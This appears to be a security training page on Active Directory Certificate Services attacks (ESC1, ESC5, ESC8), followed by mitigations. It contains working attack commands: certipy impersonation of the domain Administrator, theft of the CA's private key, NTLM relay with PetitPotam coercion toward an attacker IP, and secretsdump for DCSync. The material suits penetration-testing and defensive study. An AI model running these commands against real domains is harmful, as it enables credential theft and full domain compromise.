# Active Directory Certificate Services (ADCS)
*Advanced Attack Techniques & Exploitation*

---

## What is ADCS?

<div class="key-concept" markdown="1">
**AD CS = Active Directory Certificate Services**
</div>

Active Directory Certificate Services represents a Windows Server role that delivers essential PKI functionality within enterprise environments. This service enables Windows servers to function as a Public Key Infrastructure, providing cryptographic functionality, digital certificates, and digital signatures throughout AD environments. The cybersecurity community first became aware of significant ADCS vulnerabilities through groundbreaking research conducted by SpecterOps in 2021.

<div class="vulnerability-alert" markdown="1">
**Warning:** ADCS can be a goldmine for attackers when misconfigured!
</div>

---

## X.509 Certificate Format

Understanding certificate internals proves crucial for successful exploitation attempts:

### Certificate Components

| Component | Description |
|-----------|-------------|
| **Version & Serial Number** | Certificate metadata and unique identifier |
| **Public Key** | The public key information for encryption/authentication |
| **Subject Name** | Fields identifying the certificate owner |
| **Extensions** | Additional fields like **Extended Key Usage** that restrict certificate usage |

---

## Certificate Templates

Certificate templates serve as a critical component when analyzing ADCS security posture. These templates standardize and simplify the certificate request process while defining the certificate structure proposed by a certification authority hosted by ADCS. They establish key parameters including certificate type, authorized users, and certificate extensions.

### Security Impact

<div class="vulnerability-alert" markdown="1">
**Security Impact**

Misconfigured certificate templates can be vulnerable and allow privilege escalation!

**Tool:** We'll use **Certipy** for analysis
</div>

The security research community has identified 11 distinct ADCS vulnerabilities, designated ESC1 through ESC11. Among these, ESC1, ESC5, and ESC8 represent the most critical attack vectors.

Security professionals can approach template analysis through different methods depending on their access level:

<div class="key-concept" markdown="1">

## ESC1 - Template Takeover

This vulnerability represents the most commonly encountered and dangerous ADCS security flaw in enterprise environments.

### ESC1 Attack Requirements

<div class="esc-vulnerability" markdown="1">
**ESC1 Requirements:**
- Template allows **unprivileged user enrollment**
- No manager approval or signatures required
- Certificate can be used for **authentication**
- **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag is enabled
</div>

When these conditions align, an unprivileged user gains the ability to request a certificate for ANY other user, including Domain Administrators. This represents a critical security bypass that can lead to complete domain compromise.

### ESC1 Attack Flow

The attack methodology follows a straightforward three-step process: first, identify vulnerable templates using automated scanning tools; second, request a certificate while impersonating a high-privilege user; and third, leverage that certificate to obtain a Ticket Granting Ticket for authentication purposes.

### ESC1 Exploitation Commands

```bash
# Step 1: Request certificate for Administrator
certipy req -u $username@$domain.local -p '$password' \
    -target $DC.$domain.local -template ESC1 \
    -ca $domain-CA -upn administrator@$domain.local

# Step 2: Use certificate for authentication  
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

## ESC5 - CA Certificate Theft

This attack scenario targets complete Certificate Authority compromise through various configuration weaknesses.

### ESC5 Vulnerability Details

<div class="esc-vulnerability" markdown="1">
**ESC5:** More general configuration flaws leading to complete ADCS compromise

- Extract the **private key and certificate** of the CA itself
- Once obtained: **forge valid certificates for anyone!**
</div>

### ESC5 Attack Goal & Impact

| Aspect | Details |
|--------|---------|
| **Attack Goal** | Steal CA's private key and certificate |
| **Impact** | Complete domain compromise via certificate forgery |

```bash
# ESC5 - Backup CA certificate and private key 
certipy ca -backup -u user@domain -p password -target ca-server -ca CA-NAME
```

The implications of successful ESC5 exploitation extend far beyond typical privilege escalation scenarios. Once attackers obtain the CA's private key and certificate, they possess the capability to forge valid certificates for any user or service within the domain, essentially granting them god-like privileges across the entire PKI infrastructure.

## ESC8 - NTLM Relay to ADCS

This sophisticated attack combines HTTP enrollment capabilities with NTLM relay techniques to achieve certificate theft and subsequent domain compromise.

### ESC8 Vulnerability

<div class="esc-vulnerability" markdown="1">
**ESC8 Attack Vector:**
- ADCS allows **HTTP enrollment** without NTLM relay protection
- Certificate requests can be made via HTTP protocol
- Combine with NTLM relay → **Certificate theft**
</div>

The critical nature of this vulnerability becomes apparent when considering that Domain Controller machine accounts can perform DCSync operations, leading to complete domain compromise through certificate-based authentication.

### ESC8 Attack Flow

The attack progression involves three key phases: coercing Domain Controller authentication through tools like PetitPotam or Coercer, relaying that authentication to the Certificate Authority's HTTP endpoint, and finally obtaining a Domain Controller certificate with DCSync capabilities.

### ESC8 Attack Commands

```bash
# Step 1: Setup NTLM relay targeting ADCS HTTP endpoint
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Force DC authentication (separate terminal)
petitpotam.py attacker-ip domain-controller

# Step 3: Convert and use certificate
certipy auth -pfx certificate.pfx -dc-ip domain-controller

# Step 4: DCSync with obtained credentials
secretsdump.py domain/user@domain-controller
```

The end result of successful ESC8 exploitation provides attackers with complete domain compromise through certificate-based authentication mechanisms.

## Defense & Mitigation

### Defense Strategies

Organizations can implement several defensive measures to protect against ADCS attacks:

**ESC1 Prevention** requires disabling the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag, implementing manager approval requirements, and carefully limiting template enrollment permissions to authorized users only.

**ESC5 Prevention** focuses on securing CA private key storage through hardware security modules when possible, implementing proper PKI object ACLs, and establishing comprehensive monitoring for certificate backup operations.

**ESC8 Prevention** involves enabling HTTPS with proper authentication mechanisms, disabling HTTP enrollment entirely, and implementing Extended Protection for Authentication (EPA) to prevent relay attacks.

**Detection** capabilities should include monitoring certificate requests for anomalous patterns, auditing template modifications, and watching for unusual authentication patterns that might indicate ongoing attacks.
